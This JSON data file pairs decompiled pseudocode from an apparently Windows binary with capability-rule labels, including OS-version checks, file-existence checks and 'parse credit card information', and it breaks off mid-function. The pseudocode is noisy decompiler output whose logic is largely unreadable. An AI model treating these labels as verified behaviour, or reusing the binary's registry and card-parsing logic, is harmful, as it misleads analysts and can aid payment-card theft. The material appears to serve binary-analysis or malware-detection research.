{
    "00401140": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011ba) overlaps instruction at (ram,0x004011b9)\n// \n// WARNING: Removing unreachable block (ram,0x004011ba)\n\nuint __cdecl fcn.00401140(uint *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    uint *unaff_ESI;\n    uint32_t uVar6;\n    char *pcVar7;\n    uint *puVar8;\n    bool bVar9;\n    uint var_263h;\n    uchar var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    puVar5 = &stack0xfffffffc;\n    puVar8 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    var_160h = 0;\n    puVar8 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    bVar9 = arg_ch != 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    if ((bVar9) && (arg_ch == 0)) {\n        arg_8h = unaff_ESI + 1;\n        *(puVar8 + 3) = *unaff_ESI;\n        uVar6 = CONCAT11(0xdf, bVar9);\n        puVar5 = 0x8be181d0;\n    }\n    else {\n        uVar6 = bVar9;\n    }\n    (*_sym.imp.MSVCRT.dll_sprintf)(puVar5 + -0x160, 0x411350, arg_8h);\n    (*pcVar2)(puVar5 + -0x264, 0x411368, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    *(puVar5 + -0x20) = puVar5 + -0x160;\n    *(puVar5 + -0x18) = puVar5 + -0xc;\n    *(puVar5 + -0x14) = puVar5 + -4;\n    *(puVar5 + -0x10) = puVar5 + -8;\n    uVar4 = 0xffffffff;\n    pcVar7 = puVar5 + -0x160;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    *(puVar5 + -0x48) = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    puVar8 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *puVar8;\n        puVar8 = puVar8 + 1;\n    } while (cVar1 != '\\0');\n    *(puVar5 + -0x34) = 0x411390;\n    *(puVar5 + -0x30) = 0x41139c;\n    *(puVar5 + -0x2c) = 0x4113a8;\n    *(puVar5 + -0x28) = 0x4113b8;\n    *(puVar5 + -0x24) = 0x4113c0;\n    *(puVar5 + -0x5c) = 2;\n    *(puVar5 + -0x58) = 1;\n    *(puVar5 + -0x54) = 4;\n    *(puVar5 + -0x50) = 4;\n    *(puVar5 + -0x4c) = 4;\n    *(puVar5 + -0x1c) = arg_8h;\n    *(puVar5 + -0x44) = ~uVar4 - 1;\n    *(puVar5 + -0x40) = 4;\n    *(puVar5 + -0x3c) = 4;\n    *(puVar5 + -0x38) = 4;\n    if (uVar6 < 5) {\n        uVar6 = uVar6 * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, puVar5 + -0x264, *(puVar5 + (uVar6 - 0x34)), *(puVar5 + (uVar6 - 0x5c)), \n                              *(puVar5 + (uVar6 - 0x20)), *(puVar5 + (uVar6 - 0x48)));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar6 = uVar6 + 4;\n        } while (uVar6 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1408
    },
    "00401ad0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401af5) overlaps instruction at (ram,0x00401af4)\n// \n// WARNING: Removing unreachable block (ram,0x00401b5c)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00401ad0(uint32_t *arg_8h, char *arg_ch, uint *arg_10h, char **arg_14h)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    uint32_t in_EAX;\n    uint32_t *unaff_ESI;\n    int32_t iVar4;\n    uint32_t *unaff_EDI;\n    int32_t var_8h;\n    uint32_t var_4h;\n    char *pcVar3;\n    \n    pcVar3 = arg_ch;\n    if ((*0x10 != 0xc && 7 < &stack0xfffffffc) && (*0x10 == 0xc || SBORROW4(&stack0xfffffffc, 8) != &var_8h < 0)) {\n        uVar1 = in_EAX | 0x8b;\n        pcVar3 = in_EAX | 0x8b;\n        arg_8h = unaff_EDI;\n        if (-1 < uVar1) {\n            arg_8h = unaff_EDI + 1;\n            *pcVar3 = (*pcVar3 - uVar1) - (*unaff_ESI < *unaff_EDI);\n            *(unaff_ESI + -0x71) = *(unaff_ESI + -0x71) + (in_EAX >> 8);\n            LOCK();\n        }\n    }\n    uVar2 = fcn.004033a0(0, arg_8h, pcVar3 + 1 >> 1);\n    var_8h = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    var_4h = *(var_8h + 0x58);\n    if (uVar2 < var_4h) {\n        arg_8h = (uVar2 - var_4h & 0xffff) - 1;\n    }\n    else {\n        arg_8h = uVar2 - (var_4h & 0xffff);\n    }\n    if (arg_8h < var_4h >> 0x10) {\n        iVar4 = (arg_8h - (var_4h >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar4 = arg_8h - (var_4h >> 0x10);\n    }\n    *arg_14h = arg_ch + iVar4;\n    *arg_10h = *(var_8h + 0x58);\n    return var_8h;\n}\n",
        "token_count": 621
    },
    "004033a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403419) overlaps instruction at (ram,0x00403418)\n// \n// WARNING: Variable defined which should be unmapped: pcbData\n// WARNING: Variable defined which should be unmapped: pdwType\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.004033a0(uint32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    uint32_t in_EAX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    int32_t unaff_EBX;\n    uint *puVar7;\n    uint *puVar8;\n    uint32_t *puVar9;\n    uint16_t in_SS;\n    bool bVar10;\n    ulong uVar11;\n    uchar pvData;\n    uint var_10fh;\n    int32_t iStack77;\n    uint32_t uStack73;\n    uchar *puStack69;\n    uchar *puStack65;\n    uint32_t uStack61;\n    uint uStack57;\n    uchar *apuStack53 [2];\n    uint uStack45;\n    uint uStack41;\n    uint uStack37;\n    uint *puStack33;\n    uchar *puStack29;\n    uint *puStack25;\n    uchar uStack21;\n    uint *puStack20;\n    uint var_ch;\n    uint pdwType;\n    uint pcbData;\n    \n    puVar7 = &stack0xfffffffc;\n    puStack69 = &stack0xfffffffc;\n    bVar10 = ((CONCAT11(in_EAX >> 8 & in_EDX >> 8, in_EAX) * 2 | in_EDX) ^ 0x6c00) != unaff_EBX;\n    puStack20 = in_EAX;\n    if (bVar10) {\n        puStack20 = in_ECX << 0x10;\n        in_ECX = (in_ECX >> 8 & 0xffff00) << 8 | in_ECX & 0xffff;\n        if (!bVar10) goto code_r0x004033c8;\n    }\n    in_EAX = arg_10h;\ncode_r0x004033c8:\n    puStack20 = puStack20 & 0xffff0000 | in_SS;\n    puVar8 = puStack20;\n    puStack20 = 0x47;\n    puVar1 = unaff_EBX + -0x3f7af383;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + in_ECX;\n    if (!CARRY1(uVar3, in_ECX) && *puVar1 != 0) {\n        do {\n            arg_8h = arg_8h + *puVar8;\n            bVar10 = arg_8h >> 0x10 != 0;\n            if (bVar10) {\n                if ((bVar10) && (uStack21 = puVar8 >> 0x18,  !bVar10)) {\n                    uVar2 = in(in_EDX);\n                    *puVar8 = uVar2;\n                    puVar8 = puVar8 + 1;\n                    if (&stack0xffffffec < 1) {\n                        pvData = 0;\n                        pcbData = 0x104;\n                        puVar9 = &fcn.004033a0::var_10fh;\n                        for (; in_ECX != 0; in_ECX = in_ECX - 1) {\n                            *puVar9 = arg_8h >> 0x10;\n                            puVar9 = puVar9 + 1;\n                        }\n                        *puVar9 = 0;\n                        iStack77 = puVar9 + 3;\n                        *(puVar9 + 2) = arg_8h >> 0x10;\n                        puStack25 = &fcn.004033a0::pcbData;\n                        puStack29 = &stack0xfffffeec;\n                        puStack33 = &fcn.004033a0::pdwType;\n                        uStack37 = 0x41174c;\n                        uStack41 = 0x411724;\n                        uStack45 = 0x80000002;\n                        apuStack53[1] = 0x4034c9;\n                        uVar5 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n                        bVar10 = (POPCOUNT(uVar5 & 0xff) & 1U) != 0;\n                        if (uVar5 != 0) {\n                            return 0;\n                        }\n                        if ((bVar10) && (!bVar10)) {\n                            puVar8 = &stack0xffffffcf;\n                            cVar4 = '\\x1e';\n                            do {\n                                puVar7 = puVar7 + -1;\n                                puVar8 = puVar8 + -1;\n                                *puVar8 = *puVar7;\n                                cVar4 = cVar4 + -1;\n                            } while ('\\0' < cVar4);\n                            uVar5 = in(0x78);\n                            return uVar5;\n                        }\n                        apuStack53[0] = &stack0xfffffeec;\n                        apuStack53[1] = 0x2e;\n                        uStack57 = 0x403501;\n                        uVar11 = (*_sym.imp.MSVCRT.dll_strchr)();\n                        puStack65 = &stack0xffffffd3;\n                        if (uVar11 == NULL) {\n                            return 0;\n                        }\n                        apuStack53[1] = &stack0xfffffeec;\n                        *uVar11 = 0;\n                        apuStack53[0] = 0x403541;\n                        uStack73 = arg_8h;\n                        uStack61 = in_EAX;\n                        iVar6 = (*_sym.imp.MSVCRT.dll_atoi)();\n                        uStack57 = uVar11 >> 0x20;\n                        var_ch = uVar11;\n                        if (iVar6 != 6) {\n                            return iVar6 == 7;\n                        }\n                        return 1;\n                    }\n                }\n                uVar5 = arg_8h >> 0x10 ^ 0xdee0ed6d;\n                arg_8h = (uVar5 & 0xffff0000 | uVar5 + (uVar5 >> 8) * -0x31) + (arg_8h & 0xffff);\n            }\n            puVar8 = puVar8 + 2;\n            in_EAX = in_EAX - 1;\n            in_EDX = in_EDX & 0xffffff;\n        } while (in_EAX != 0);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 1524
    },
    "00403570": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403570(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    var_14h = 0x411704;\n    var_10h = 0x4116fc;\n    var_ch = 0x41170c;\n    var_8h = 0x411714;\n    var_4h = 0x41171c;\n    uVar3 = 0;\n    puVar2 = &var_14h;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, *puVar2);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + 1;\n    } while (uVar3 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, 0x4116f4);\n    return iVar1 == 0;\n}\n",
        "token_count": 291
    },
    "00403ff0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00403ff0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00404840(0x80000002, 0x41149c, 0x4114e8, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 134
    },
    "004044e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint64_t fcn.004044e0(void)\n\n{\n    uint32_t extraout_EDX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 152
    },
    "004012d0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401492) overlaps instruction at (ram,0x0040148e)\n// \n// WARNING: Removing unreachable block (ram,0x00401379)\n\nulong __cdecl fcn.004012d0(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    char *pcVar2;\n    char cVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint16_t uVar7;\n    uint uVar8;\n    uint32_t *puVar9;\n    uint8_t uVar10;\n    uint8_t uVar11;\n    uchar *puVar12;\n    uint32_t uVar13;\n    uint uVar14;\n    uint32_t uVar15;\n    uint16_t uVar16;\n    uint32_t in_ECX;\n    int32_t in_EDX;\n    char cVar17;\n    int16_t iVar18;\n    uint unaff_EBX;\n    uint *puVar19;\n    uint *puVar20;\n    uint *puVar21;\n    uchar *unaff_ESI;\n    uchar *puVar22;\n    uint32_t uVar23;\n    uint unaff_EDI;\n    ushort in_SS;\n    bool bVar24;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar25;\n    bool bVar26;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    uint16_t uStack24;\n    uint16_t uStack22;\n    uint16_t uStack20;\n    ushort uStack18;\n    \n    iVar18 = unaff_EBX;\n    puVar20 = &stack0xfffffffc;\n    uStack24 = unaff_EDI;\n    puVar21 = &stack0xfffffffc;\n    puVar22 = unaff_ESI;\n    if (in_ZF) goto code_r0x004012e5;\n    do {\n        puVar21 = puVar20;\n        puVar22 = unaff_ESI;\n        if (in_ZF) {\n            puVar19 = &uStack20;\n            puVar21 = &uStack20;\n            uStack20 = puVar20;\n            uStack18 = puVar20 >> 0x10;\n            cVar17 = '\\x10';\n            do {\n                puVar20 = puVar20 + -1;\n                puVar19 = puVar19 + -1;\n                *puVar19 = *puVar20;\n                cVar17 = cVar17 + -1;\n            } while ('\\0' < cVar17);\n        }\ncode_r0x004012e5:\n        puVar12 = puVar21[2];\n        *puVar12 = 0xb7;\n        unaff_ESI = puVar22;\n        if ((!in_ZF) && (in_ZF)) {\n            puVar12 = puVar12 & 0xffffff00 | *0x4bb148d3;\n            unaff_ESI = puVar22 + 1;\n            out(*puVar22, in_EDX);\n        }\n        puVar12[1] = 0x89;\n        puVar12[2] = 0xf0;\n        puVar12[3] = 0x18;\n        uVar7 = in_ECX;\n        uVar16 = uVar7 - 1 & uStack24 | 0x61be;\n        in_ZF = uVar16 == 0;\n        bVar24 = (POPCOUNT(uVar16 & 0xff) & 1U) == 0;\n        puVar12[4] = 0xbd;\n        if (bVar24) goto code_r0x00401358;\n        uStack20 = puVar12;\n        uStack18 = puVar12 >> 0x10;\n        if (!bVar24) goto code_r0x00401358;\n        puVar19 = segment(in_SS, *0x10 + -0x10);\n        in_EDX = -0x4843615b;\n        puVar20 = puVar21;\n    } while (bVar24);\n    puVar12 = *puVar19;\ncode_r0x00401358:\n    puVar12[5] = 0xe2;\n    uStack20 = in_EDX;\n    uVar10 = in_ECX >> 8;\n    bVar24 = (POPCOUNT(uVar10 ^ unaff_EBX) & 1U) == 0;\n    uStack18 = in_ECX >> 0x10;\n    puVar12[6] = 0xe4;\n    if ((bVar24) || (!bVar24)) {\n        puVar12[7] = 0x80;\n        uStack18 = in_EDX >> 0x10;\n        uStack22 = unaff_EDI >> 0x10;\n    }\n    else {\n        bVar24 = 0xffffffbf < unaff_ESI;\n        unaff_ESI = unaff_ESI + 0x40;\n        *(in_EDX + 0x57) = *(in_EDX + 0x57) + 'f' + bVar24;\n        uStack24 = uStack20;\n        uStack22 = uVar7;\n        uStack20 = uVar7;\n    }\n    puVar12[8] = 0xf3;\n    uVar15 = CONCAT22(uStack18, uStack20);\n    uVar13 = puVar21[2];\n    *(uVar13 + 9) = 0x36;\n    uVar23 = unaff_ESI | 0x561b;\n    bVar26 = SBORROW4(uVar23, uVar15);\n    bVar25 = uVar23 - uVar15 < 0;\n    bVar24 = uVar23 == uVar15;\n    *(uVar13 + 10) = 0x4a;\n    if ((!bVar25) && (bVar25)) {\n        pcVar4 = CONCAT22(uStack22, uStack24) + 4;\n        pcVar2 = unaff_ESI + 4;\n        *(CONCAT22(uStack22, uStack24) + 0x1c) = in_ST0;\n        unaff_ESI = unaff_ESI + 5;\n        bVar26 = SBORROW1(*pcVar2, *pcVar4);\n        cVar17 = *pcVar2;\n        cVar3 = *pcVar4;\n        bVar25 = cVar17 - cVar3 < '\\0';\n        bVar24 = cVar17 == cVar3;\n        in_ST0 = in_ST1;\n        in_ST1 = in_ST2;\n    }\n    *(uVar13 + 0xb) = 0x65;\n    if ((bVar24 || bVar26 != bVar25) || (!bVar24 && bVar26 == bVar25)) {\n        *(uVar13 + 0xc) = 0x40;\n    }\n    else {\n        in_ST0 = in_ST0 - *(puVar21 + 0x40c692c9);\n        uVar11 = uVar13;\n        uVar13 = uVar13 | 0x40;\n        bVar24 = (uVar11 | 0x40) == 0;\n    }\n    puVar20 = puVar21;\n    if ((!bVar24) && (bVar24)) {\n        puVar19 = &stack0xfffffff0;\n        puVar20 = &stack0xfffffff0;\n        cVar17 = '\\x10';\n        do {\n            puVar21 = puVar21 + -1;\n            puVar19 = puVar19 + -1;\n            *puVar19 = *puVar21;\n            cVar17 = cVar17 + -1;\n        } while ('\\0' < cVar17);\n    }\n    *(uVar13 + 0xd) = 0x9d;\n    bVar24 = (in_ECX & 0xffff0000 | uVar7 & 0xff | uVar10 - unaff_EBX << 8) != uVar15;\n    iVar5 = puVar20[2];\n    *(iVar5 + 0xe) = 0x6e;\n    puVar21 = puVar20;\n    if ((bVar24) && (!bVar24)) {\n        puVar19 = &stack0xfffffff0;\n        puVar21 = &stack0xfffffff0;\n        cVar17 = '\\x10';\n        do {\n            puVar20 = puVar20 + -1;\n            puVar19 = puVar19 + -1;\n            *puVar19 = *puVar20;\n            cVar17 = cVar17 + -1;\n        } while ('\\0' < cVar17);\n    }\n    *(iVar5 + 0xf) = 0x32;\n    bVar24 = false;\n    bVar25 = -1 < (uVar13 + iVar18 | 0x11a9U);\n    puVar9 = CONCAT22(uStack18, uStack20);\n    *(iVar5 + 0x10) = 0x71;\n    if (((bVar25) && (!bVar25)) || (*(iVar5 + 0x11) = 0x80,  bVar25)) {\n        *(uVar13 + 0x8316dbec) = in_ST0;\n        uVar10 = uVar13 - 1;\n        in_AF = 9 < (uVar10 & 0xf) | in_AF;\n        uVar10 = uVar10 + in_AF * '\\x06';\n        uVar13 = uVar13 - 1 & 0xffffff00 | uVar10 + (0x90 < (uVar10 & 0xf0) | in_AF * (0xf9 < uVar10)) * '`';\n        uVar15 = *puVar9;\n        *puVar9 = *puVar9 + 0x47c6df84;\n        puVar1 = uVar13 + 0xc987137c;\n        uVar23 = 0xb839207b < uVar15;\n        uVar15 = *puVar1;\n        uVar6 = *puVar1 + uVar13;\n        bVar24 = CARRY4(*puVar1, uVar13) || CARRY4(uVar6, uVar23);\n        *puVar1 = uVar6 + uVar23;\n        in_ST0 = in_ST1;\n        if ((SCARRY4(uVar15, uVar13) != SCARRY4(uVar6, uVar23)) != *puVar1 < 0) goto code_r0x00401485;\n    }\n    iVar18 = CONCAT31(unaff_EBX >> 8, 0xa1);\ncode_r0x00401485:\n    *(uVar13 + 0x8316dbec) = in_ST0;\n    uVar13 = uVar13 - 1;\n    uVar10 = 9 < (uVar13 & 0xf) | in_AF;\n    uVar11 = uVar13 + uVar10 * '\\x06';\n    uVar11 = uVar11 + (0x90 < (uVar11 & 0xf0) | bVar24 | uVar10 * (0xf9 < uVar11)) * '`';\n    uVar15 = uVar13 & 0xffffff00 | uVar11;\n    *puVar9 = *puVar9 + 0xa1b3df84;\n    cVar17 = iVar18;\n    *(iVar5 + 0x12) = cVar17;\n    bVar24 = (POPCOUNT(uStack20 ^ iVar18 >> 8 | 0x67) & 1U) != 0;\n    uVar8 = CONCAT22(uStack18, uStack20);\n    *(iVar5 + 0x13) = 0x41;\n    if ((bVar24) && (!bVar24)) {\n        puVar20 = &uStack20;\n        uStack20 = puVar21;\n        uStack18 = puVar21 >> 0x10;\n        cVar17 = '\\x1e';\n        do {\n            puVar21 = puVar21 + -1;\n            puVar20 = puVar20 + -1;\n            *puVar20 = *puVar21;\n            cVar17 = cVar17 + -1;\n        } while ('\\0' < cVar17);\n        uVar14 = in(0x78);\n        return CONCAT44(uVar8, uVar14);\n    }\n    *(iVar5 + 0x14) = 0x8b;\n    bVar24 = (CONCAT11(((uVar13 >> 8) - cVar17) + 'M', uVar11) & 0x26ae) != 1;\n    *(iVar5 + 0x15) = cVar17;\n    if ((bVar24) && (!bVar24)) {\n        uVar15 = uVar13 & 0xffffff00 | *0x4bb148d3;\n        out(*unaff_ESI, uStack20);\n    }\n    *(iVar5 + 0x16) = 0x31;\n    uVar8 = CONCAT22(uStack18, uStack20);\n    *(iVar5 + 0x17) = 0xfb;\n    uStack20 = uVar15;\n    uStack18 = uVar15 >> 0x10;\n    puVar20 = puVar21[3];\n    *puVar20 = 0x18;\n    return CONCAT44(uVar8, puVar20);\n}\n",
        "token_count": 2973
    },
    "00404040": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404102) overlaps instruction at (ram,0x004040fe)\n// \n// WARNING: Removing unreachable block (ram,0x00404153)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl\nfcn.00404040(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint8_t *arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t extraout_ECX;\n    uint8_t *puVar4;\n    uint8_t *unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    uint *puVar5;\n    ulong uVar6;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404390(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fcn.00404390(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    fcn.00404390(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    iVar1 = arg_20h + 0xe0;\n    puVar4 = arg_1ch;\n    while( true ) {\n        uVar6 = fcn.00404390(arg_18h, puVar4, arg_14h, 0x20, iVar1);\n        puVar4 = uVar6 >> 0x20;\n        iVar1 = uVar6;\n        if ((0xffffffeb < &stack0xfffffed0) || (0xffffffeb >= &stack0xfffffed0)) break;\n        arg_14h = extraout_ECX + -1;\n        if (arg_14h == 0 || *0x10 != 0x11c) {\n            *unaff_EDI = arg_20h + 4;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    iVar1 = fcn.00403ff0();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar1;\n    }\n    var_10ch = 0;\n    puVar5 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_4h = 0x104;\n    *(puVar5 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar2 = fcn.00404840(0x80000001, 0x41151c, 0x411548, &var_8h, &var_10ch, &var_4h);\n    puVar4 = unaff_EBX;\n    iVar1 = unaff_ESI;\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        puVar4 = unaff_EBX;\n        iVar1 = unaff_ESI;\n        if ((iVar2 == 0) && ((iVar2 < 0 || (puVar4 = arg_1ch,  iVar1 = arg_20h,  iVar2 >= 0)))) {\n            *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n            puVar4 = unaff_EBX;\n            iVar1 = unaff_ESI;\n        }\n    }\n    *puVar4 = *puVar4 & 0xc3;\n    *(iVar1 + -0x74a4a1a1) = *(iVar1 + -0x74a4a1a1) + iVar1;\n    uVar3 = in(0x5d);\n    return uVar3;\n}\n",
        "token_count": 1010
    },
    "00404560": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nbool fcn.00404560(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    bool bVar6;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &stack0xfffffffc;\n    var_4h = 0x104;\n    iVar2 = fcn.00404840(0x80000002, 0x4115b4, 0x4115f4, &var_8h, &var_10ch, &var_4h);\n    bVar6 = iVar2 == 0;\n    if (!bVar6) {\n        puVar5 = &stack0xfffffffc;\n        if ((!bVar6) && (puVar5 = &stack0xfffffffc,  bVar6)) {\n            puVar4 = &stack0xfffffee0;\n            puVar5 = &stack0xfffffee0;\n            cVar1 = '\\x10';\n            do {\n                puVar3 = puVar3 + -1;\n                puVar4 = puVar4 + -1;\n                *puVar4 = *puVar3;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n        }\n        iVar2 = (*_sym.imp.MSVCRT.dll__access)(puVar5 + -0x10c, 0);\n        return iVar2 != -1;\n    }\n    return false;\n}\n",
        "token_count": 341
    },
    "004015e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004015e0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004044a0(0x4112d4);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "00401dc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ee8) overlaps instruction at (ram,0x00401ee6)\n// \n\nuint fcn.00401dc0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uchar extraout_CL;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    ushort extraout_DX;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    bool bVar10;\n    char cStack560;\n    uint uStack559;\n    uchar uStack300;\n    uint uStack299;\n    \n    cStack560 = '\\0';\n    uStack300 = '\\0';\n    puVar5 = &uStack559;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &uStack300 + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&cStack560, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar7 = &cStack560;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &uStack300;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = 